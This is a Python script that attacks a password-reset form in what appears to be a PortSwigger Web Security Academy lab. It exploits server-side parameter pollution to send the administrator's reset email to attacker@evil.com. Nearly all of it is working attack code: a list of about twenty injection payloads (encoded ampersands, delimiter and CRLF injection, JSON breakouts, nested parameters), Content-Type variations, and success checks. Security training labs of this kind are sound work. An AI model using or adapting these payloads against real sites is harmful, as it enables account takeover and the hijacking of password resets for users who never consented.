#!/usr/bin/env python3
import requests
import sys
import json
import urllib.parse

def exploit_parameter_pollution(lab_url):
    """Exploit server-side parameter pollution in password reset"""

    session = requests.Session()

    # Get session
    session.get(f"{lab_url}/login")
    print(f"Session: {session.cookies.get('session')}")

    reset_url = f"{lab_url}/forgot-password"

    # The malformed Content-Type causes incorrect parsing
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # MALFORMED - missing "application/"
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password"
    }

    print("\n[*] Testing parameter pollution attacks...")

    # Different parameter pollution techniques
    payloads = [
        # URL encoding within parameter value
        "username=administrator&username=carlos",
        "username=administrator%26email=attacker@evil.com",
        "username=administrator%26result=attacker@evil.com",
        "username=administrator&email=attacker@evil.com",

        # Parameter injection using URL encoding
        "username=administrator%26username=carlos",
        "username=administrator%26to=attacker@evil.com",

        # Query string delimiter injection
        "username=administrator%3femail=attacker@evil.com",
        "username=administrator%23email=attacker@evil.com",

        # Space and special character injection
        "username=administrator%20email=attacker@evil.com",
        "username=administrator%0aemail=attacker@evil.com",
        "username=administrator%0demail=attacker@evil.com",

        # Backend parameter names
        "username=administrator&recipient=attacker@evil.com",
        "username=administrator&to=attacker@evil.com",
        "username=administrator&sendTo=attacker@evil.com",
        "username=administrator&dest=attacker@evil.com",

        # JSON injection attempt
        'username=administrator","email":"attacker@evil.com',
        'username=administrator"}&email=attacker@evil.com&x={"',

        # Parameter override
        "username=administrator&username=attacker@evil.com",
        "csrf=test&username=administrator&csrf=&email=attacker@evil.com",

        # Nested parameters
        "username[]=administrator&username[email]=attacker@evil.com",
        "username[name]=administrator&username[email]=attacker@evil.com",
    ]

    for i, payload in enumerate(payloads, 1):
        print(f"\n[Test {i}] Payload: {payload}")

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            print(f"[!!!] Working payload: {payload}")
                            return True
                        elif email != "*****@normal-user.net":
                            print(f"[!] Email changed to: {email}")

                except json.JSONDecodeError:
                    print(f"Non-JSON response: {response.text[:200]}")

        except Exception as e:
            print(f"Error: {e}")

    # Test with different Content-Type variations
    print("\n[*] Testing with Content-Type variations...")

    ct_variations = [
        "",  # Empty
        "application/x-www-form-urlencoded",  # Correct one
        "text/plain",
        "application/json",
    ]

    for ct in ct_variations:
        print(f"\n[*] Content-Type: {ct or '(empty)'}")
        test_headers = headers.copy()
        if ct:
            test_headers["Content-Type"] = ct
        else:
            del test_headers["Content-Type"]

        payload = "username=administrator&email=attacker@evil.com"

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=test_headers,
                allow_redirects=False
            )

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")
                    if "result" in result and "attacker" in str(result["result"]):
                        print(f"[!!!] Success with Content-Type: {ct}")
                        return True
                except:
                    pass
        except:
            pass

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Exploiting parameter pollution at: {lab_url}")
    exploit_parameter_pollution(lab_url)